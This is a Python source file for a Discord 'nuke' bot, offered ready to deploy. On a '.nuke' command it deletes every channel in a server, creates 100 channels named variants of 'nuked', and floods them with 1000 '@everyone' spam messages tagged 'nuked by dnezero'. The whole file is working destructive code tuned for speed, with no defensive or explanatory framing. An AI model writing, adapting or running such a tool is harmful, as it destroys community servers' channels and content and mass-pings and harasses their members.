import asyncio
import discord
from discord.ext import commands
import random
import time
import os

# --- CONFIGURE THESE (or use env vars) ---
BOT_TOKEN = os.getenv("TOKEN")  # Railway env variable
if not BOT_TOKEN:
    raise ValueError("No TOKEN found in environment variables. Set TOKEN on Railway.")

PREFIX = "."

# Nuke Configuration (you can change these directly)
CHANNEL_NAME = "nuked"
MESSAGE = "@everyone @here nuked by dnezero"
AMOUNT_OF_CHANNELS = 100
AMOUNT_OF_MESSAGES = 1000

# Random channel name variations
RANDOM_CHANNEL_NAMES = [
    "𝕟𝕦𝕜𝕖𝕕",
    "𝔫𝔲𝔨𝔢𝔡",
    "𝚗𝚞𝚔𝚎𝚍",
    "ɴᴜᴋᴇᴅ",
    "𝓷𝓾𝓴𝓮𝓭",
    "nuked"
]
USE_RANDOM_NAMES = True   # Set to False to use CHANNEL_NAME only

# -----------------------
# DO NOT MODIFY BELOW THIS LINE
# -----------------------

def get_channel_name():
    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
        return random.choice(RANDOM_CHANNEL_NAMES)
    return CHANNEL_NAME

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def send_messages_fast(channels, message, total):
    if not channels:
        return
    semaphore = asyncio.Semaphore(50)
    async def send_one(channel, msg):
        async with semaphore:
            try:
                await channel.send(msg)
            except Exception:
                pass
    tasks = []
    for i in range(total):
        channel = channels[i % len(channels)]
        tasks.append(send_one(channel, message))
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_server(guild: discord.Guild):
    print(f"Starting nuke on {guild.name} ({guild.id})")
    start_time = time.perf_counter()

    # Step 1: Delete all channels
    print("Deleting all channels...")
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        return_exceptions=True
    )

    # Step 2: Create new channels
    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
    async def create_one():
        return await guild.create_text_channel(get_channel_name())
    
    channels = await asyncio.gather(
        *(create_one() for _ in range(AMOUNT_OF_CHANNELS)),
        return_exceptions=True
    )

    # Step 3: Send messages
    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    if text_channels:
        print(f"Sending {AMOUNT_OF_MESSAGES} messages...")
        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)

    elapsed = time.perf_counter() - start_time
    print(f"Nuke completed in {elapsed:.2f} seconds!")

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")
    print(f"Prefix: {PREFIX}")
    print(f"Command: {PREFIX}nuke")
    print("=" * 50)

@bot.command(name="nuke")
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ You need Administrator permission to use this command!")
        return
    await ctx.send("💣 Nuking server in progress...")
    await nuke_server(ctx.guild)

@bot.command(name="config")
async def config(ctx):
    config_msg = f"""
**Current Configuration:**
📝 Channel Name: `{CHANNEL_NAME}`
🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
💬 Message: `{MESSAGE[:50]}...`
📊 Channels: `{AMOUNT_OF_CHANNELS}`
📨 Messages: `{AMOUNT_OF_MESSAGES}`
    """
    await ctx.send(config_msg)

if __name__ == "__main__":
    print("Starting Nuke Bot...")
    print("=" * 50)
    bot.run(BOT_TOKEN)
